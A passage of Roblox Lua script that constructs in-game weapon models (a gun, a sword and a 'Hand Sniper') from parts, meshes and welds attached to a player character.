	local prt10=part(3,modelzorz,0,0,BrickColor.new("Black"),"Part10",vt(1,1,1))

	msh1=mesh("BlockMesh",prt1,"","",vt(0,0,0),vt(1.1,0.6,1.1))
	msh2=mesh("BlockMesh",prt2,"","",vt(0,0,0),vt(0.2,0.7,1.05))
	msh3=mesh("BlockMesh",prt3,"","",vt(0,0,0),vt(1.05,0.7,0.2))
	msh4=mesh("BlockMesh",prt4,"","",vt(0,0,0),vt(1.4,1.6,0.2))
	msh5=mesh("BlockMesh",prt5,"","",vt(0,0,0),vt(1.4,1.6,0.2))
	msh6=mesh("BlockMesh",prt6,"","",vt(0,0,0),vt(0.6,0.1,0.6))
	msh7=mesh("SpecialMesh",prt7,"Sphere","",vt(0,0,0),vt(0.5,0.5,0.5))
	msh8=mesh("CylinderMesh",prt8,"","",vt(0,0,0),vt(0.6,0.1,0.6))
	msh9=mesh("CylinderMesh",prt9,"","",vt(0,0,0),vt(0.3,0.1,0.3))
	msh10=mesh("CylinderMesh",prt10,"","",vt(0,0,0),vt(0.2,0.1,0.2))

	local wld1=weld(prt1,prt1,RightArm,euler(0,0,0)*cf(0,0.3,0))
	local wld2=weld(prt2,prt2,prt1,euler(0,0,0)*cf(0,0.4,0))
	local wld3=weld(prt3,prt3,prt1,euler(0,0,0)*cf(0,0.4,0))
	local wld4=weld(prt4,prt4,prt1,euler(0,0.785,0)*cf(0,-0.51,0))
	local wld5=weld(prt5,prt5,prt1,euler(0,-0.785,0)*cf(0,-0.51,0))
	local wld6=weld(prt6,prt6,prt1,euler(0,0,0)*cf(0,-1.3,0))
	local wld7=weld(prt7,prt7,prt6,euler(0,0,0)*cf(0,0,0))
	local wld8=weld(prt8,prt8,prt1,euler(0,0,-1.57)*cf(-0.55,0,0))
	local wld9=weld(prt9,prt9,prt8,euler(0,0,0)*cf(0,0.05,0))
	local wld10=weld(prt10,prt10,prt9,euler(0,0,0)*cf(0,0.01,0))

	numb2=0
	for i=1,4 do
		numb=0.3
		for i=1,3 do
			local prtclaw=part(3,modelzorz,0,0,BrickColor.new("Medium stone grey"),"Partclaw",vt(1,1,1))
			mshclaw=mesh("SpecialMesh",prtclaw,"Wedge","",vt(0,0,0),vt(0.1,0.3,0.1))
			local wldclaw=weld(prtclaw,prtclaw,prt1,euler(1.57,-1.57,-1.57)*cf(-0.55,0.3,numb)*euler(0,numb2,0))
			numb=numb-0.3
		end
		numb2=numb2+1.57
	end

	numb=0
	for i=1,5 do
		local prtgear=part(3,modelzorz,0,0,BrickColor.new("Medium stone grey"),"Partgear",vt(1,1,1))
		mshgear=mesh("BlockMesh",prtgear,"","",vt(0,0,0),vt(0.4,0.09,0.07))
		local wldgear=weld(prtgear,prtgear,prt9,euler(0,numb,0)*cf(0,0,0))
		numb=numb+0.628
	end

	local gun = Instance.new("Model") 
	gun.Parent = modelzorz
	gun.Name = "Blitz" 
	gun.Parent=nil

	local gprt1=part(3,gun,0,0,BrickColor.new("Dark stone grey"),"Part1",vt(1,1,1))
	local gprt2=part(3,gun,0,0,BrickColor.new("Black"),"Part2",vt(1,1,1))
	local gprt3=part(3,gun,0,0,BrickColor.new("Black"),"Part3",vt(1,1,1))
	local gprt4=part(3,gun,0,0,BrickColor.new("Black"),"Part4",vt(1,1,1))
	local gprt5=part(3,gun,0,0,BrickColor.new("Black"),"Part5",vt(1,1,1))
	local gprt6=part(3,gun,0,0,BrickColor.new("Dark stone grey"),"Part6",vt(1,1,1))
	local gprt7=part(3,gun,0,0,BrickColor.new("Medium stone grey"),"Part7",vt(1,1,1))
	local gprt8=part(3,gun,0,0,BrickColor.new("Black"),"Part8",vt(1,1,1))
	local gprt9=part(3,gun,0,0,BrickColor.new("Dark stone grey"),"Part9",vt(1,1,1))
	local gprt10=part(3,gun,0,0,BrickColor.new("Black"),"Part10",vt(1,1,1))
	local gprt11=part(3,gun,0,0,BrickColor.new("Black"),"Part11",vt(1,1,1))
	local gprt12=part(3,gun,0,0,BrickColor.new("Black"),"Part12",vt(1,1,1))
	local gprt13=part(3,gun,0,0,BrickColor.new("Black"),"Part13",vt(1,1,1))
	local gprt14=part(3,gun,0,0,BrickColor.new("Black"),"Part14",vt(1,1,1))
	local gprt15=part(3,gun,0,0,BrickColor.new("Dark stone grey"),"Part15",vt(1,1,1))
	local gprt16=part(3,gun,0,0,BrickColor.new("Dark stone grey"),"Part16",vt(1,1,1))
	local gprt17=part(3,gun,0,0,BrickColor.new("Really black"),"Part17",vt(1,1,1))
	local gprt18=part(3,gun,0,0,BrickColor.new("Black"),"Part18",vt(1,1,1))
	local gprt19=part(3,gun,0,0,BrickColor.new("Dark stone grey"),"Part19",vt(1,1,1))
	local gprt20=part(3,gun,0,0,BrickColor.new("Medium stone grey"),"Part20",vt(1,1,1))
	local gprt21=part(3,gun,0,0,BrickColor.new("Medium stone grey"),"Part21",vt(1,1,1))
	local gprt22=part(3,gun,0,0,BrickColor.new("Medium stone grey"),"Part22",vt(1,1,1))

	gmsh1=mesh("BlockMesh",gprt1,"","",vt(0,0,0),vt(0.2,0.7,0.2))
	gmsh2=mesh("BlockMesh",gprt2,"","",vt(0,0,0),vt(0.25,0.2,0.25))
	gmsh3=mesh("BlockMesh",gprt3,"","",vt(0,0,0),vt(0.25,0.2,0.25))
	gmsh4=mesh("BlockMesh",gprt4,"","",vt(0,0,0),vt(0.5,0.5,0.7))
	gmsh5=mesh("CylinderMesh",gprt5,"","",vt(0,0,0),vt(0.5,0.49,0.5))
	gmsh6=mesh("CylinderMesh",gprt6,"","",vt(0,0,0),vt(0.1,0.5,0.1))
	gmsh7=mesh("BlockMesh",gprt7,"","",vt(0,0,0),vt(0.55,0.3,0.3))
	gmsh8=mesh("CylinderMesh",gprt8,"","",vt(0,0,0),vt(0.7,0.7,0.7))
	gmsh9=mesh("CylinderMesh",gprt9,"","",vt(0,0,0),vt(0.4,0.71,0.4))
	gmsh10=mesh("BlockMesh",gprt10,"","",vt(0,0,0),vt(0.3,0.4,0.3))
	gmsh11=mesh("BlockMesh",gprt11,"","",vt(0,0,0),vt(0.2,2.5,0.5))
	gmsh12=mesh("CylinderMesh",gprt12,"","",vt(0,0,0),vt(0.3,0.51,0.3))
	gmsh13=mesh("BlockMesh",gprt13,"","",vt(0,0,0),vt(0.2,0.3,0.5))
	gmsh14=mesh("CylinderMesh",gprt14,"","",vt(0,0,0),vt(0.3,0.2,0.3))
	gmsh15=mesh("CylinderMesh",gprt15,"","",vt(0,0,0),vt(0.2,0.35,0.2))
	gmsh16=mesh("CylinderMesh",gprt16,"","",vt(0,0,0),vt(0.2,0.21,0.2))
	gmsh17=mesh("CylinderMesh",gprt17,"","",vt(0,0,0),vt(0.15,0.22,0.15))
	gmsh18=mesh("CylinderMesh",gprt18,"","",vt(0,0,0),vt(0.6,0.2,0.6))
	gmsh19=mesh("CylinderMesh",gprt19,"","",vt(0,0,0),vt(0.7,0.2,0.7))
	gmsh20=mesh("CylinderMesh",gprt20,"","",vt(0,0,0),vt(0.6,1.5,0.6))
	gmsh21=mesh("CylinderMesh",gprt21,"","",vt(0,0,0),vt(0.69,0.5,0.69))
	gmsh22=mesh("CylinderMesh",gprt22,"","",vt(0,0,0),vt(0.69,0.31,0.69))

	local GunWelds={}
	local gwld1=weld(gprt1,gprt1,Torso,euler(0.5,1.57,0)*cf(1,-0.5,1.8))
	local gwld2=weld(gprt2,gprt2,gprt1,euler(0,0,0)*cf(0,0.3,0))
	local gwld3=weld(gprt3,gprt3,gprt1,euler(0,0,0)*cf(0,-0.3,0))
	local gwld4=weld(gprt4,gprt4,gprt3,euler(-0.5,0,0)*cf(0,-0.1,-0.1))
	local gwld5=weld(gprt5,gprt5,gprt4,euler(0,0,1.57)*cf(0,0,-0.35))
	local gwld6=weld(gprt6,gprt6,gprt5,cf(0,0,-0.1))
	local gwld7=weld(gprt7,gprt7,gprt4,cf(0,0,-0.1))
	local gwld8=weld(gprt8,gprt8,gprt4,euler(0,0,1.57)*cf(0,0,0.4))
	local gwld9=weld(gprt9,gprt9,gprt8,cf(0,0,0))
	local gwld10=weld(gprt10,gprt10,gprt8,euler(1.57,0,0)*cf(0,0,0.4)*euler(0,0.7,0))
	local gwld11=weld(gprt11,gprt11,gprt8,euler(1.57,0,0)*cf(0.3,0,0.9))
	local gwld12=weld(gprt12,gprt12,gprt11,euler(-1.57,0,0)*cf(0,-1.3,0))
	local gwld13=weld(gprt13,gprt13,gprt12,cf(0,0,0.3)*euler(0,1.57,0))
	local gwld14=weld(gprt14,gprt14,gprt13,cf(0.05,0,0.25))
	local gwld15=weld(gprt15,gprt15,gprt14,cf(0,0,0))
	local gwld16=weld(gprt16,gprt16,gprt13,euler(0,0,1.57)*cf(0,0,-0.1))
	local gwld17=weld(gprt17,gprt17,gprt16,cf(0,0,0))
	local gwld18=weld(gprt18,gprt18,gprt8,euler(1.57,0,0)*cf(-0.1,0,0.4))
	local gwld19=weld(gprt19,gprt19,gprt18,cf(-0.05,-0.15,0))
	local gwld20=weld(gprt20,gprt20,gprt19,cf(0,-0.8,0))
	local gwld21=weld(gprt21,gprt21,gprt20,cf(0,0.5,0))
	local gwld22=weld(gprt22,gprt22,gprt20,cf(0,-0.6,0))
	table.insert(GunWelds,gwld1)
	table.insert(GunWelds,gwld2)
	table.insert(GunWelds,gwld3)
	table.insert(GunWelds,gwld4)
	table.insert(GunWelds,gwld5)
	table.insert(GunWelds,gwld6)
	table.insert(GunWelds,gwld7)
	table.insert(GunWelds,gwld8)
	table.insert(GunWelds,gwld9)
	table.insert(GunWelds,gwld10)
	table.insert(GunWelds,gwld11)
	table.insert(GunWelds,gwld12)
	table.insert(GunWelds,gwld13)
	table.insert(GunWelds,gwld14)
	table.insert(GunWelds,gwld15)
	table.insert(GunWelds,gwld16)
	table.insert(GunWelds,gwld17)
	table.insert(GunWelds,gwld18)
	table.insert(GunWelds,gwld19)
	table.insert(GunWelds,gwld20)
	table.insert(GunWelds,gwld21)
	table.insert(GunWelds,gwld22)

	numb=1.57
	for i=1,10 do
		local gprt23=part(3,gun,0,0,BrickColor.new("Medium stone grey"),"Part23",vt(1,1,1))
		gmsh23=mesh("CylinderMesh",gprt23,"","",vt(0,0,0),vt(0.15,0.7,0.15))
		local gwld23=weld(gprt23,gprt23,gprt20,cf(0,-0.1,-0.25)*euler(0,numb,0))
		table.insert(GunWelds,gwld23)
		local gprt24=part(3,gun,0,0,BrickColor.new("Really black"),"Part24",vt(1,1,1))
		gmsh24=mesh("CylinderMesh",gprt24,"","",vt(0,0,0),vt(0.14,1.52,0.14))
		local gwld24=weld(gprt24,gprt24,gprt20,cf(0,0,-0.25)*euler(0,numb,0))
		table.insert(GunWelds,gwld24)
		numb=numb+0.628
	end

	local sword=Instance.new("Model") 
	sword.Parent=modelzorz
	sword.Name="Daku" 
	sword.Parent=nil

	local sprt1=part(3,sword,0,0,BrickColor.new("Dark stone grey"),"Part1",vt(1,1,1))
	local sprt2=part(3,sword,0,0,BrickColor.new("Medium stone grey"),"Part2",vt(1,1,1))
	local sprt3=part(3,sword,0,0,BrickColor.new("Dark stone grey"),"Part3",vt(1,1,1))
	local sprt4=part(3,sword,0,0,BrickColor.new("Medium stone grey"),"Part4",vt(1,1,1))
	local sprt5=part(3,sword,0,0,BrickColor.new("Light stone grey"),"Part5",vt(1,1,1))
	local sprt6=part(3,sword,0,0,BrickColor.new("Medium stone grey"),"Part6",vt(1,1,1))
	local sprt7=part(3,sword,0,0,BrickColor.new("Medium stone grey"),"Part7",vt(1,1,1))
	local sprt8=part(3,sword,0,0,BrickColor.new("Light stone grey"),"Part8",vt(1,1,1))
	local sprt9=part(3,sword,0,0,BrickColor.new("Medium stone grey"),"Part9",vt(1,1,1))
	local sprt10=part(3,sword,0,0,BrickColor.new("Dark stone grey"),"Part10",vt(1,1,1))
	local sprt11=part(3,sword,0,0,BrickColor.new("Medium stone grey"),"Part11",vt(1,1,1))
	local sprt12=part(3,sword,0,0,BrickColor.new("Light stone grey"),"Part12",vt(1,1,1))
	local sprt13=part(3,sword,0,0,BrickColor.new("Medium stone grey"),"Part13",vt(1,1,1))
	local sprt14=part(3,sword,0,0,BrickColor.new("Medium stone grey"),"Part14",vt(1,1,1))
	local sprt15=part(3,sword,0,0,BrickColor.new("Light stone grey"),"Part15",vt(1,1,1))
	local sprt16=part(3,sword,0,1,BrickColor.new("Black"),"Hitbox",vt(1,7,1.5))
	local sprt17=part(3,sword,0,0,BrickColor.new("Bright yellow"),"Top",vt(1,1,1))
	local sprt18=part(3,sword,0,1,BrickColor.new("Black"),"Mid",vt(0.1,0.1,0.1))
	local sprt19=part(3,sword,0,0,BrickColor.new("Bright yellow"),"Bottom",vt(1,1,1))

	smsh1=mesh("BlockMesh",sprt1,"","",vt(0,0,0),vt(0.2,1,0.2))
	smsh2=mesh("SpecialMesh",sprt2,"Head","",vt(0,0,0),vt(0.4,0.3,0.4))
	smsh3=mesh("BlockMesh",sprt3,"","",vt(0,0,0),vt(0.25,0.5,0.25))
	smsh4=mesh("SpecialMesh",sprt4,"Head","",vt(0,0,0),vt(0.5,0.3,0.5))
	smsh5=mesh("CylinderMesh",sprt5,"","",vt(0,0,0),vt(0.5,0.2,0.5))
	smsh6=mesh("BlockMesh",sprt6,"","",vt(0,0,0),vt(0.5,0.2,0.35))
	smsh7=mesh("BlockMesh",sprt7,"","",vt(0,0,0),vt(0.2,0.19,0.2))
	smsh8=mesh("BlockMesh",sprt8,"","",vt(0,0,0),vt(0.8,0.15,0.5))
	smsh9=mesh("SpecialMesh",sprt9,"Head","",vt(0,0,0),vt(0.4,0.3,0.4))
	smsh10=mesh("BlockMesh",sprt10,"","",vt(0,0,0),vt(0.25,0.5,0.25))
	smsh11=mesh("SpecialMesh",sprt11,"Head","",vt(0,0,0),vt(0.5,0.3,0.5))
	smsh12=mesh("CylinderMesh",sprt12,"","",vt(0,0,0),vt(0.5,0.2,0.5))
	smsh13=mesh("BlockMesh",sprt13,"","",vt(0,0,0),vt(0.5,0.2,0.35))
	smsh14=mesh("BlockMesh",sprt14,"","",vt(0,0,0),vt(0.2,0.19,0.2))
	smsh15=mesh("BlockMesh",sprt15,"","",vt(0,0,0),vt(0.8,0.15,0.5))
	smsh17=mesh("CylinderMesh",sprt17,"","",vt(0,0,0),vt(0.1,0.05,0.1))
	smsh19=mesh("CylinderMesh",sprt19,"","",vt(0,0,0),vt(0.1,0.05,0.1))

	local SwordWelds={}
	local swld1=weld(sprt1,sprt1,Torso,euler(0,0,1.57)*cf(0,-4,0))
	local swld2=weld(sprt2,sprt2,sprt1,euler(0,0,0)*cf(0,-0.4,0))
	local swld3=weld(sprt3,sprt3,sprt2,euler(0,0,0)*cf(0,-0.3,0))
	local swld4=weld(sprt4,sprt4,sprt3,euler(0,0,0)*cf(0,-0.3,0))
	local swld5=weld(sprt5,sprt5,sprt4,euler(0,0,0)*cf(0,-0.15,0))
	local swld6=weld(sprt6,sprt6,sprt5,euler(0,0,1.57)*cf(0,-0.2,0))
	local swld7=weld(sprt7,sprt7,sprt6,euler(0,0.785,0)*cf(0,0,-0.17))
	local swld8=weld(sprt8,sprt8,sprt5,euler(0,0,1.57)*cf(0,-0.4,0))
	local swld9=weld(sprt9,sprt9,sprt1,euler(3.14,3.14,0)*cf(0,0.4,0))
	local swld10=weld(sprt10,sprt10,sprt9,euler(0,0,0)*cf(0,-0.3,0))
	local swld11=weld(sprt11,sprt11,sprt10,euler(0,0,0)*cf(0,-0.3,0))
	local swld12=weld(sprt12,sprt12,sprt11,euler(0,0,0)*cf(0,-0.15,0))
	local swld13=weld(sprt13,sprt13,sprt12,euler(0,0,1.57)*cf(0,-0.2,0))
	local swld14=weld(sprt14,sprt14,sprt13,euler(0,0.785,0)*cf(0,0,-0.17))
	local swld15=weld(sprt15,sprt15,sprt12,euler(0,0,1.57)*cf(0,-0.4,0))
	local swld16=weld(sprt16,sprt16,sprt1,cf(0,0,-0.3))
	local swld17=weld(sprt17,sprt17,sprt1,euler(0.55,0,0)*cf(0,3.7,-0.79))
	local swld18=weld(sprt18,sprt18,sprt1,cf(0,0,-0.8))
	local swld19=weld(sprt19,sprt19,sprt1,euler(-0.55,0,0)*cf(0,-3.7,-0.79))
	table.insert(SwordWelds,swld1)
	table.insert(SwordWelds,swld2)
	table.insert(SwordWelds,swld3)
	table.insert(SwordWelds,swld4)
	table.insert(SwordWelds,swld5)
	table.insert(SwordWelds,swld6)
	table.insert(SwordWelds,swld7)
	table.insert(SwordWelds,swld8)
	table.insert(SwordWelds,swld9)
	table.insert(SwordWelds,swld10)
	table.insert(SwordWelds,swld11)
	table.insert(SwordWelds,swld12)
	table.insert(SwordWelds,swld13)
	table.insert(SwordWelds,swld14)
	table.insert(SwordWelds,swld15)
	table.insert(SwordWelds,swld16)
	table.insert(SwordWelds,swld17)
	table.insert(SwordWelds,swld18)
	table.insert(SwordWelds,swld19)

	numb=0
	numb2=0
	bend=0
	for i=1,8 do
		local sprtblade1=part(3,sword,0.3,0,BrickColor.new("White"),"Partblade1",vt(1,1,1))
		smshblade1=mesh("SpecialMesh",sprtblade1,"Wedge","",vt(0,0,0),vt(0.1+numb2,0.7,0.7))
		local swldblade1=weld(sprtblade1,sprtblade1,sprt5,euler(0,0,0)*cf(0,-0.3-numb,0.1+bend)*euler(-bend,0,0))
		table.insert(SwordWelds,swldblade1)
		local sprtblade2=part(3,sword,0.3,0,BrickColor.new("White"),"Partblade2",vt(1,1,1))
		smshblade2=mesh("SpecialMesh",sprtblade2,"Wedge","",vt(0,0,0),vt(0.1+numb2,0.7,0.7))
		local swldblade2=weld(sprtblade2,sprtblade2,sprt12,euler(0,0,0)*cf(0,-0.3-numb,0.1+bend)*euler(-bend,0,0))
		table.insert(SwordWelds,swldblade2)
		numb=numb+0.3
		numb2=numb2-0.01
		bend=bend+0.05
	end

	local sniper=Instance.new("Model") 
	sniper.Parent=modelzorz
	sniper.Name="Hand Sniper" 
	sniper.Parent=nil

	local snprt1=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part1",vt(1,1,1))
	local snprt2=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part2",vt(1,1,1))
	local snprt3=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part3",vt(1,1,1))
	local snprt4=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part4",vt(1,1,1))
	local snprt5=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part5",vt(1,1,1))
	local snprt6=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part6",vt(1,1,1))
	local snprt7=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part7",vt(1,1,1))
	local snprt8=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part8",vt(1,1,1))
	local snprt9=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part9",vt(1,1,1))
	local snprt10=part(3,sniper,0,0,BrickColor.new("Black"),"Part10",vt(1,1,1))
	local snprt11=part(3,sniper,0,0,BrickColor.new("Black"),"Part11",vt(1,1,1))
	local snprt12=part(3,sniper,0,0,BrickColor.new("Black"),"Part12",vt(1,1,1))
	local snprt13=part(3,sniper,0,0,BrickColor.new("Black"),"Part13",vt(1,1,1))
	local snprt14=part(3,sniper,0,0,BrickColor.new("Black"),"Part14",vt(1,1,1))
	local snprt15=part(3,sniper,0,0,BrickColor.new("Really black"),"Part15",vt(1,1,1))
	local snprt16=part(3,sniper,0,0,BrickColor.new("Black"),"Part16",vt(1,1,1))
	local snprt17=part(3,sniper,0,0,BrickColor.new("Black"),"Part17",vt(1,1,1))
	local snprt18=part(3,sniper,0,0,BrickColor.new("Black"),"Part18",vt(1,1,1))
	local snprt19=part(3,sniper,0,0,BrickColor.new("Black"),"Part19",vt(1,1,1))
	local snprt20=part(3,sniper,0,0,BrickColor.new("Black"),"Part20",vt(1,1,1))
	local snprt21=part(3,sniper,0,0,BrickColor.new("Black"),"Part21",vt(1,1,1))
	local snprt22=part(3,sniper,0,0,BrickColor.new("Black"),"Part22",vt(1,1,1))
	local snprt23=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part23",vt(1,1,1))
	local snprt24=part(3,sniper,0,0,BrickColor.new("Medium stone grey"),"Part24",vt(1,1,1))
	local snprt25=part(3,sniper,0,0,BrickColor.new("Black"),"Part25",vt(1,1,1))
	local snprt26=part(3,sniper,0,0,BrickColor.new("Black"),"Part26",vt(1,1,1))
	local snprt27=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part27",vt(1,1,1))
	local snprt28=part(3,sniper,0,0,BrickColor.new("Black"),"Part28",vt(1,1,1))
	local snprt29=part(3,sniper,0,0,BrickColor.new("Black"),"Part29",vt(1,1,1))

	snmsh1=mesh("BlockMesh",snprt1,"","",vt(0,0,0),vt(0.2,1,0.2))
	snmsh2=mesh("BlockMesh",snprt2,"","",vt(0,0,0),vt(0.201,0.5,0.5))
	snmsh3=mesh("BlockMesh",snprt3,"","",vt(0,0,0),vt(0.2,0.3,0.3))
	snmsh4=mesh("BlockMesh",snprt4,"","",vt(0,0,0),vt(0.199,0.6,0.7))
	snmsh5=mesh("BlockMesh",snprt5,"","",vt(0,0,0),vt(0.198,0.9,0.3))
	snmsh6=mesh("BlockMesh",snprt6,"","",vt(0,0,0),vt(0.202,3.5,0.3))
	snmsh7=mesh("BlockMesh",snprt7,"","",vt(0,0,0),vt(0.1,0.5,0.1))
	snmsh8=mesh("BlockMesh",snprt8,"","",vt(0,0,0),vt(0.1,0.6,0.1))
	snmsh9=mesh("BlockMesh",snprt9,"","",vt(0,0,0),vt(0.201,1.7,0.2))
	snmsh10=mesh("BlockMesh",snprt10,"","",vt(0,0,0),vt(0.15,0.4,0.4))
	snmsh11=mesh("BlockMesh",snprt11,"","",vt(0,0,0),vt(0.201,0.8,0.2))
	snmsh12=mesh("CylinderMesh",snprt12,"","",vt(0,0,0),vt(0.2,4,0.2))
	snmsh13=mesh("CylinderMesh",snprt13,"","",vt(0,0,0),vt(0.4,0.2,0.4))
	snmsh14=mesh("CylinderMesh",snprt14,"","",vt(0,0,0),vt(0.22,0.3,0.22))
	snmsh15=mesh("CylinderMesh",snprt15,"","",vt(0,0,0),vt(0.15,0.301,0.15))
	snmsh16=mesh("BlockMesh",snprt16,"","",vt(0,0,0),vt(0.1,0.7,0.1))
	snmsh17=mesh("BlockMesh",snprt17,"","",vt(0,0,0),vt(0.05,0.2,0.1))
	snmsh18=mesh("BlockMesh",snprt18,"","",vt(0,0,0),vt(0.05,0.2,0.1))
	snmsh19=mesh("BlockMesh",snprt19,"","",vt(0,0,0),vt(0.05,0.2,0.1))
	snmsh20=mesh("BlockMesh",snprt20,"","",vt(0,0,0),vt(0.05,0.2,0.1))
	snmsh21=mesh("CylinderMesh",snprt21,"","",vt(0,0,0),vt(0.2,0.099,0.2))
	snmsh22=mesh("CylinderMesh",snprt22,"","",vt(0,0,0),vt(0.2,0.099,0.2))
	snmsh23=mesh("CylinderMesh",snprt23,"","",vt(0,0,0),vt(0.199,1,0.199))
	snmsh24=mesh("CylinderMesh",snprt24,"","",vt(0,0,0),vt(0.15,1.01,0.15))
	snmsh25=mesh("BlockMesh",snprt25,"","",vt(0,0,0),vt(0.3,0.5,0.2))
	snmsh26=mesh("CylinderMesh",snprt26,"","",vt(0,0,0),vt(0.05,0.3,0.05))
	snmsh27=mesh("SpecialMesh",snprt27,"Sphere","",vt(0,0,0),vt(0.1,0.1,0.1))
	snmsh28=mesh("BlockMesh",snprt28,"","",vt(0,0,0),vt(0.05,0.3,0.05))
	snmsh29=mesh("CylinderMesh",snprt29,"","",vt(0,0,0),vt(0.15,0.4,0.15))

	local SniperWelds={}
	local snwld1=weld(snprt1,snprt1,Torso,euler(0.5,0,0)*cf(0,-4,0))
	local snwld2=weld(snprt2,snprt2,snprt1,euler(-0.5,0,0)*cf(0,0.5,-0.2))
	local snwld3=weld(snprt3,snprt3,snprt2,euler(-0.785,0,0)*cf(0,-0.1,-0.2))
	local snwld4=weld(snprt4,snprt4,snprt3,euler(0.785,0,0)*cf(0,-0.4,0))
	local snwld5=weld(snprt5,snprt5,snprt4,cf(0,0,-0.3))
	local snwld6=weld(snprt6,snprt6,snprt1,euler(1.07,0,0)*cf(0,-0.5,0.2))
	local snwld7=weld(snprt7,snprt7,snprt6,euler(0,0,0)*cf(0,0.2,0.5))
	local snwld8=weld(snprt8,snprt8,snprt6,euler(1.57,0,0)*cf(0,-0.1,0.25))
	local snwld9=weld(snprt9,snprt9,snprt6,euler(0,0,0)*cf(0,-0.9,0.25))
	local snwld10=weld(snprt10,snprt10,snprt9,euler(0,0,0)*cf(0,0.5,0.2))
	local snwld11=weld(snprt11,snprt11,snprt6,euler(0,0,0)*cf(0,0.2,-0.2))
	local snwld12=weld(snprt12,snprt12,snprt11,euler(0,0,0)*cf(0,-2,0))
	local snwld13=weld(snprt13,snprt13,snprt12,euler(0,0,0)*cf(0,-1.8,0))
	local snwld14=weld(snprt14,snprt14,snprt12,euler(0,0,0)*cf(0,-2,0))
	local snwld15=weld(snprt15,snprt15,snprt14,euler(0,0,0)*cf(0,0,0))
	local snwld16=weld(snprt16,snprt16,snprt11,euler(0,0,0)*cf(0,0,-0.1))
	local snwld17=weld(snprt17,snprt17,snprt16,euler(1.57,0,0)*cf(0.05,0.2,-0.1))
	local snwld18=weld(snprt18,snprt18,snprt16,euler(1.57,0,0)*cf(-0.05,0.2,-0.1))
	local snwld19=weld(snprt19,snprt19,snprt16,euler(1.57,0,0)*cf(-0.05,-0.2,-0.1))
	local snwld20=weld(snprt20,snprt20,snprt16,euler(1.57,0,0)*cf(0.05,-0.2,-0.1))
	local snwld21=weld(snprt21,snprt21,snprt16,euler(0,0,0)*cf(0,0.2,-0.2))
	local snwld22=weld(snprt22,snprt22,snprt16,euler(0,0,0)*cf(0,-0.2,-0.2))
	local snwld23=weld(snprt23,snprt23,snprt16,euler(0,0,0)*cf(0,0,-0.2))
	local snwld24=weld(snprt24,snprt24,snprt23,euler(0,0,0)*cf(0,0,0))
	local snwld25=weld(snprt25,snprt25,snprt6,euler(0,0,0)*cf(0,-0.5,0))
	local snwld26=weld(snprt26,snprt26,snprt25,cf(0,-0.3,0)*euler(0.5,0.7,1.57))
	local snwld27=weld(snprt27,snprt27,snprt26,cf(0,-0.1,0))
	local snwld28=weld(snprt28,snprt28,snprt6,euler(1.57-0.5,0,0)*cf(0,0.2,0.2))
	local snwld29=weld(snprt29,snprt29,snprt9,euler(0,0.2,1.57)*cf(0,-0.8,0.1))
	table.insert(SniperWelds,snwld1)
	table.insert(SniperWelds,snwld2)
	table.insert(SniperWelds,snwld3)
	table.insert(SniperWelds,snwld4)
	table.insert(SniperWelds,snwld5)
	table.insert(SniperWelds,snwld6)
	table.insert(SniperWelds,snwld7)
	table.insert(SniperWelds,snwld8)
	table.insert(SniperWelds,snwld9)
	table.insert(SniperWelds,snwld10)
	table.insert(SniperWelds,snwld11)
	table.insert(SniperWelds,snwld12)
	table.insert(SniperWelds,snwld13)
	table.insert(SniperWelds,snwld14)
	table.insert(SniperWelds,snwld15)
	table.insert(SniperWelds,snwld16)
	table.insert(SniperWelds,snwld17)
	table.insert(SniperWelds,snwld18)
	table.insert(SniperWelds,snwld19)
	table.insert(SniperWelds,snwld20)
	table.insert(SniperWelds,snwld21)
	table.insert(SniperWelds,snwld22)
	table.insert(SniperWelds,snwld23)
	table.insert(SniperWelds,snwld24)
	table.insert(SniperWelds,snwld25)
	table.insert(SniperWelds,snwld26)
	table.insert(SniperWelds,snwld27)
	table.insert(SniperWelds,snwld28)
	table.insert(SniperWelds,snwld29)

	numb=-0.15
	numb2=0.1
	for i=1,2 do
		local snprt30=part(3,sniper,0,0,BrickColor.new("Black"),"Part30",vt(1,1,1))
		local snprt31=part(3,sniper,0,0,BrickColor.new("Black"),"Part31",vt(1,1,1))
		local snprt32=part(3,sniper,0,0,BrickColor.new("Black"),"Part32",vt(1,1,1))
		local snprt33=part(3,sniper,0,0,BrickColor.new("Black"),"Part33",vt(1,1,1))
		local snprt34=part(3,sniper,0,0,BrickColor.new("Black"),"Part34",vt(1,1,1))
		local snprt35=part(3,sniper,0,0,BrickColor.new("Black"),"Part35",vt(1,1,1))
		local snprt36=part(3,sniper,0,0,BrickColor.new("Black"),"Part36",vt(1,1,1))
		local snprt37=part(3,sniper,0,0,BrickColor.new("Black"),"Part37",vt(1,1,1))
		snmsh30=mesh("CylinderMesh",snprt30,"","",vt(0,0,0),vt(0.2,0.1,0.2))
		snmsh31=mesh("CylinderMesh",snprt31,"","",vt(0,0,0),vt(0.1,0.5,0.1))
		snmsh32=mesh("CylinderMesh",snprt32,"","",vt(0,0,0),vt(0.15,0.1,0.15))
		snmsh33=mesh("CylinderMesh",snprt33,"","",vt(0,0,0),vt(0.125,0.3,0.125))
		snmsh34=mesh("CylinderMesh",snprt34,"","",vt(0,0,0),vt(0.15,0.2,0.15))
		snmsh35=mesh("CylinderMesh",snprt35,"","",vt(0,0,0),vt(0.08,0.8,0.08))
		snmsh36=mesh("CylinderMesh",snprt36,"","",vt(0,0,0),vt(0.15,0.2,0.15))
		snmsh37=mesh("CylinderMesh",snprt37,"","",vt(0,0,0),vt(0.2,0.1,0.2))
		local snwld30=weld(snprt30,snprt30,snprt29,euler(0,0,0)*cf(0,numb,0))
		local snwld31=weld(snprt31,snprt31,snprt30,euler(0,0,1.57+numb2)*cf(0.25,0,0))
		local snwld32=weld(snprt32,snprt32,snprt31,cf(0,0.25,0))
		local snwld33=weld(snprt33,snprt33,snprt32,cf(0,0.15,0))
		local snwld34=weld(snprt34,snprt34,snprt33,cf(0,0.1,0))
		local snwld35=weld(snprt35,snprt35,snprt34,cf(0,0.4,0))
